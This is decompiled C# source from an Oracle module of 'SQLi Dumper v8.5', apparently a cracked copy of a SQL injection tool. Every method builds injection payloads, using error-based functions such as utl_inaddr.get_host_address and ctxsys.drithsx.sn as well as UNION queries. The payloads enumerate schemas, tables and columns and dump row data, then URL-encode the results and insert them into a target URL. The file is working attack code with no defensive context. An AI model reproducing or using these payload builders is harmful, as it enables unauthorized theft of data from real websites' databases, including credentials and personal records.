// Decompiled with JetBrains decompiler
// Type: DataBase.Oracle
// Assembly: SQLi Dumper, Version=8.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFDD07D3-5737-4188-BACA-DE2D004C7CCF
// Assembly location: C:\Users\cole\Desktop\SQLi Dumper v8.5 [VeryClean]\SQLi v.8.5 VeryClean by Stephanny.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;

namespace DataBase
{
  public class Oracle
  {
    private const string CAST_ASCHAR = "cast(# as char(255))";
    private const string UNION = "select # from dual";
    private const string CONCAT = "(%K%||#||%K%)";
    private const string ERROR_GET_HOST_ADDRESS = "utl_inaddr.get_host_address(#)";
    private const string ERROR_DRITHSX_SN = "ctxsys.drithsx.sn(1,#)";
    private const string ERROR_GETMAPPINGXPATH = "ordsys.ord_dicom.getmappingxpath(#,1,1)";

    private static string GetQuery(InjectionType oMethod, OracleErrorType oType)
    {
      string str = "";
      if (oMethod != InjectionType.Error)
        return "#";
      switch (oType)
      {
        case OracleErrorType.NONE:
          str = "#";
          break;
        case OracleErrorType.GET_HOST_ADDRESS:
          str = "utl_inaddr.get_host_address(#)";
          break;
        case OracleErrorType.DRITHSX_SN:
          str = "ctxsys.drithsx.sn(1,#)";
          break;
        case OracleErrorType.GETMAPPINGXPATH:
          str = "ordsys.ord_dicom.getmappingxpath(#,1,1)";
          break;
      }
      return str;
    }

    public static string Info(
      string sTraject,
      InjectionType oMethod,
      OracleErrorType bError,
      List<string> lColumn,
      bool bCastAsChar,
      string sEndUrl = "")
    {
      string sqlChar1 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      string sqlChar2 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string str1 = Conversions.ToString(Interaction.IIf(bCastAsChar, (object) "cast(# as char(255))", (object) "#"));
      string str2;
      if (lColumn.Count == 1)
      {
        str2 = "(%K%||#||%K%)".Replace("#", str1.Replace("#", lColumn[0].Trim()));
      }
      else
      {
        string newValue = "";
        int num = checked (lColumn.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (index > 0)
            newValue = newValue + "||" + sqlChar2 + "||";
          string str3 = str1.Replace("#", lColumn[index].Trim());
          newValue += str3;
          checked { ++index; }
        }
        str2 = "(%K%||#||%K%)".Replace("#", newValue);
      }
      string sData = Oracle.GetQuery(oMethod, bError).Replace("#", str2.Replace("%K%", sqlChar1));
      string newValue1 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue1) + sEndUrl;
    }

    public static string DataBases(
      string sTraject,
      InjectionType oMethod,
      MySQLErrorType bError,
      bool bCastAsChar,
      bool bCorrentDB,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      List<string> lDBsAdded = null)
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string str1 = Conversions.ToString(Interaction.IIf(bCastAsChar, (object) "cast(# as char(255))", (object) "#"));
      string newValue1;
      if (bCorrentDB)
        newValue1 = "(select " + str1.Replace("#", "global_name") + "from global_name)";
      else if (lDBsAdded.Count == 0)
      {
        newValue1 = "(select distinct owner from all_tables where rownum = 1)";
      }
      else
      {
        string str2 = "(select distinct owner from all_tables where rownum = 1 and not owner in (";
        int num = checked (lDBsAdded.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (index > 0)
            str2 += ",";
          str2 += Globals.G_Utilities.ConvertTextToSQLChar(lDBsAdded[index], false, "||", "chr");
          checked { ++index; }
        }
        string str3 = str2 + ")";
        if (!string.IsNullOrEmpty(sWhere))
          str3 = str3 + " and " + sWhere;
        if (!string.IsNullOrEmpty(sOrderBy))
          str3 = str3 + " order by " + sOrderBy;
        newValue1 = str3 + ")";
      }
      string newValue2 = "(%K%||#||%K%)".Replace("#", newValue1);
      string sData = Oracle.GetQuery(oMethod, (OracleErrorType) bError).Replace("#", newValue2).Replace("%K%", sqlChar);
      string newValue3 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue3) + sEndUrl;
    }

    public static string Tables(
      string sTraject,
      InjectionType oMethod,
      MySQLErrorType bError,
      string sDataBase,
      bool bCastAsChar,
      int iIndex,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      Conversions.ToString(Interaction.IIf(bCastAsChar, (object) "cast(# as char(255))", (object) "#"));
      string newValue1 = "(%K%||#||%K%)".Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select table_name from (select rownum r, table_name from all_tables where owner = " + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) ") "), (object) "where r = "), (object) checked (iIndex + 1)), (object) ")")));
      string sData = Oracle.GetQuery(oMethod, (OracleErrorType) bError).Replace("#", newValue1).Replace("%K%", sqlChar);
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string Columns(
      string sTraject,
      InjectionType oMethod,
      MySQLErrorType bError,
      string sDataBase,
      string sTable,
      bool bCastAsChar,
      int iIndex,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "")
    {
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      Conversions.ToString(Interaction.IIf(bCastAsChar, (object) "cast(# as char(255))", (object) "#"));
      string newValue1 = "(%K%||#||%K%)".Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select column_name from (select rownum r, column_name from all_tab_columns where owner = " + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name = " + Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) ") "), (object) "where r = "), (object) checked (iIndex + 1)), (object) ")")));
      string sData = Oracle.GetQuery(oMethod, (OracleErrorType) bError).Replace("#", newValue1).Replace("%K%", sqlChar);
      string newValue2 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue2) + sEndUrl;
    }

    public static string Dump(
      string sTraject,
      InjectionType oMethod,
      MySQLErrorType bError,
      string sDataBase,
      string sTable,
      List<string> lColumn,
      bool bCastAsChar,
      OracleTopN oTopN,
      int iIndex,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      string sCustomQuery = "")
    {
      string str1 = "";
      string sqlChar1 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      string sqlChar2 = Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      string str2 = Conversions.ToString(Interaction.IIf(bCastAsChar, (object) "cast(# as char(255))", (object) "#"));
      string newValue1;
      if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
      {
        string newValue2 = "";
        string str3;
        if (lColumn.Count == 1)
        {
          str3 = "(#) as t".Replace("#", lColumn[0].Trim());
        }
        else
        {
          int num = checked (lColumn.Count - 1);
          int index = 0;
          while (index <= num)
          {
            if (index > 0)
              newValue2 = newValue2 + "||" + sqlChar2 + "||";
            newValue2 += lColumn[index].Trim();
            checked { ++index; }
          }
          str3 = "(#) as t".Replace("#", newValue2);
        }
        switch (oTopN)
        {
          case OracleTopN.ROWNUM:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select " + str2.Replace("#", "t") + " " + "from (" + "select rownum r, " + str3 + " " + "from %DB%.%TB%"), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) ") "), (object) "where r = "), (object) checked (iIndex + 1)), (object) ")"));
            break;
          case OracleTopN.RANK:
          case OracleTopN.DENSE_RANK:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select " + str2.Replace("#", "t") + " " + "from (" + "select " + str3 + ", "), Interaction.IIf(oTopN == OracleTopN.RANK, (object) "rank()", (object) "dense_rank()")), (object) " over (order by "), (object) lColumn[0]), (object) " desc) sal_rank "), (object) "from %DB%.%TB%"), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) ") "), (object) "where sal_rank = "), (object) checked (iIndex + 1)), (object) ")"));
            break;
        }
        newValue1 = str1.Replace("%DB%", sDataBase).Replace("%TB%", sTable);
      }
      else
        newValue1 = ("(" + sCustomQuery + ")").Replace("[x]", Conversions.ToString(checked (iIndex + 1))).Replace("[s]", "||" + sqlChar2 + "||");
      string newValue3 = "(%K%||#||%K%)".Replace("#", newValue1);
      string sData = Oracle.GetQuery(oMethod, (OracleErrorType) bError).Replace("#", newValue3).Replace("%K%", sqlChar1);
      string newValue4 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue4) + sEndUrl;
    }

    public static string Count(
      string sTraject,
      InjectionType oMethod,
      OracleErrorType bError,
      bool bCastAsChar,
      Schema o,
      string sDataBase,
      string sTable,
      string sWhere = "",
      string sEndUrl = "")
    {
      string newValue1 = "";
      string str = Conversions.ToString(Interaction.IIf(bCastAsChar, (object) "cast(# as char(255))", (object) "#"));
      string sqlChar = Globals.G_Utilities.ConvertTextToSQLChar(Globals.DATA_SPLIT_STR, false, "||", "chr");
      Globals.G_Utilities.ConvertTextToSQLChar(Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
      switch (o)
      {
        case Schema.DATABASES:
          newValue1 = "(select " + str.Replace("#", "count(*)") + "from (select distinct owner from all_tables))";
          break;
        case Schema.TABLES:
          newValue1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select " + str.Replace("#", "count(*)") + "from all_tables " + "where owner = " + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")"));
          break;
        case Schema.COLUMNS:
          newValue1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select " + str.Replace("#", "count(*)") + "from all_tab_columns " + "where owner = " + Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name = " + Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), (object) ")"));
          break;
        case Schema.ROWS:
          newValue1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("(select " + str.Replace("#", "count(*)") + "from " + sDataBase + "." + sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere))), (object) ")"));
          break;
      }
      string newValue2 = "(%K%||#||%K%)".Replace("#", newValue1);
      string sData = Oracle.GetQuery(oMethod, bError).Replace("#", newValue2).Replace("%K%", sqlChar);
      string newValue3 = Globals.G_Utilities.EncodeURL(sData);
      return sTraject.Replace("[t]", newValue3) + sEndUrl;
    }
  }
}
